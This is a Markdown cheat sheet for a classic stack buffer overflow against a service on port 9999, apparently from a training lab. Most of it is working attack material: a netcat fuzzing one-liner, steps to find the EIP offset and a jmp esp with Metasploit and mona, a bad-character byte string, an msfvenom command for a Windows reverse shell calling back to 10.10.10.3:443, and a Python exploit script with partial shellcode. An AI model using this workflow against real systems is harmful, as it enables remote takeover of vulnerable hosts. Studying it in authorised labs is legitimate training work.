# Buffer overflow

use tcpdump to verify if your egg and payload are correct:
```
tcpdump -i eth0 -XX 'port 9999' 
```

## Fuzz the bug

```
python -c 'print "A" * 500' | nc <victim> 9999
```

## search for the EIP

/usr/share/metasploit-framework/tools/exploit/pattern_create
/usr/share/metasploit-framework/tools/exploit/pattern_offset

## search for a jump esp

```
!mona modules
!mona find -s "\xff\xe4" <module>
```

## create a poc

BE CAREFUL : on python 3, socket need bytes.

egg = b'A' * 524 + b'\xf3\x12\x17\x31' + b'C' * 500

Now, we could execute our 'C' sleed.

## search for badchars

```
badchars = b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f" \
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" \
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f" \
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f" \
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f" \
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf" \
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf" \
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

egg = b'A' * 524 + b'\xf3\x12\x17\x31' + badchars

```

look at debugger to see if all chars are forwardeds

current bad chars : '\x00\x20\x0A\x0D'


## add our payload with nop

Add some nop before payload. If not, shellcode begin can be altered : https://reverseengineering.stackexchange.com/questions/15745/why-shell-code-only-with-nop-slide-working-for-me.

If possible, test the payload on a testing env.
Use msfvenom.

if you experiment some netcat connect back but no shell, ensure that you use not a staged payload (windows/shell_reverse_tcp and not windows/shell/reverse_tcp)


## python3 example : 

```
# msfvenom -p windows/shell_reverse_tcp -f python -b '\x00' LHOST=10.10.10.3 LPORT=443
buf =  b""
buf += b"\xb8\xb4\x21\x20\xeb\xdd\xc5\xd9\x74\x24\xf4\x5d\x31"
buf += b"\xc9\xb1\x52\x31\x45\x12\x83\xed\xfc\x03\xf1\x2f\xc2"
...

egg = b'A' * 524 + b'\xf3\x12\x17\x31' + b'\x90' * 16 + buf

HOST = '10.10.10.2'    # The remote host
PORT = 9999              # The same port as used by the server

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(egg)
    data = s.recv(1024)
    print(data)

print("Got your reverse shell?")
```

## links

https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
https://github.com/ebtaleb/peda_cheatsheet/blob/master/peda.md
